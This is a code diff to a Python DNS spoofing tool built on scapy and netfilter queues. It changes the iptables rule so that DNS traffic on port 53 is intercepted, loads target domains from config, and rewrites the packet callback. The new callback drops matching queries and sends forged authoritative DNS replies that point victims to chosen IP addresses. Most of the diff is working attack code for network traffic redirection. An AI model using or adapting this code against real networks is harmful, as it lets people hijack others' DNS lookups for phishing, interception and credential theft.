@@ -18,7 +18,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 # _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
 # _iptablesr_ =  "iptables -I FORWARD -j NFQUEUE --queue-num 1"
-_iptablesr_ = "iptables -A OUTPUT -j NFQUEUE"
+#_iptablesr_ = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
+_iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
 _iptablesrm_ = "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X"
 
 
@@ -27,7 +28,7 @@ class DNSSpoofer(threading.Thread):
     def __init__(self, event, queue, config={}):
         threading.Thread.__init__(self)
         self.event = event
-        print('Inserting iptables rules: {}'.format(_iptablesr_))
+        logger.debug('Inserting iptables rules: {}'.format(_iptablesr_))
         try:
             os.system(_iptablesr_)
         except OSError:
@@ -35,33 +36,53 @@ class DNSSpoofer(threading.Thread):
             sys.exit(-1)
         self.queue = queue
         self.spoofaddr = {}  # should be thread safe - like all built-in types
+        self.__load_config(config)
+        self.configurator()
+        print(config)
 
-    def callback(self):
+    def __load_config(self, config={}):
+        self.spoofaddr = config.get('target', {})
+        if not self.spoofaddr:
+            logger.warning('No targets specified!')
+        logger.debug('Targets set up! {}'.format(self.spoofaddr))
+
+    def callback(self, packet):
         logger.critical("HIT")
         if self.event.is_set():
-            raise KeyboardInterrupt  # really awful
+            return
 
         payload = packet.get_payload()
         pkt = IP(payload)
+        flag = False
 
         if not pkt.haslayer(DNSQR):
             packet.accept()
             # TODO - edit packet if needed
         else:
-            if pkt[DNS].qd.qname in self.spoofaddr.keys():
-                logger.debug(
-                    "Target domain DNS request found! target: {} - redirecting to: {}".format(pkt[DNS].qd.qname,
-                                                                                              self.spoofaddr[
-                                                                                                  pkt[DNS].qd.qname]))
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
-                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[pkt[DNS].qd.qname]))
-                packet.set_payload(str(spoofed_pkt))
-                packet.accept()
-            else:
-                logger.debug()
-                packet.accept()
+            res = str(pkt[DNS].qd.qname, 'utf-8')
+            logger.warning('HIT DNS RESPONSE! {}'.format(res))
+            for i in self.spoofaddr.keys():
+                if i in res:
+                    key = i
+                    if flag:
+                        continue
+                    # Build the spoofed response
+                    spoofedPayload = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[key]))
+
+                    print("Spoofing DNS response to: ")
+                    spoofedPayload.show()
+                    packet.drop()
+                    send(spoofedPayload, verbose=False)
+                    flag = True
+                else:
+                    logger.debug('Asked for nonspoofed domain! {}'.format(res))
+                    if flag:
+                        continue
+                    packet.accept()
+                    flag = True
 
     def configurator(self):
         if not self.event.is_set():
@@ -93,7 +114,7 @@ class DNSSpoofer(threading.Thread):
                 except ValueError:
                     ip = None
                     print("{} is not a valid IP address!")
-                self.spoofaddr[cmd[1]] = ip
+                self.spoofaddr[cmd[1]] = str(ip)
 
     def run(self):
         # This is the intercept
@@ -110,10 +131,10 @@ class DNSSpoofer(threading.Thread):
             finally:
                 q.unbind()
         print("DNSspoofer finishing!")
-
         try:
             logger.debug('Reverting iptables rules!')
             os.system(_iptablesrm_)
+            logger.debug('Rules reverted!')
         except OSError:
             logger.critical('Cannot revert iptables rules!')
             sys.exit(-1)
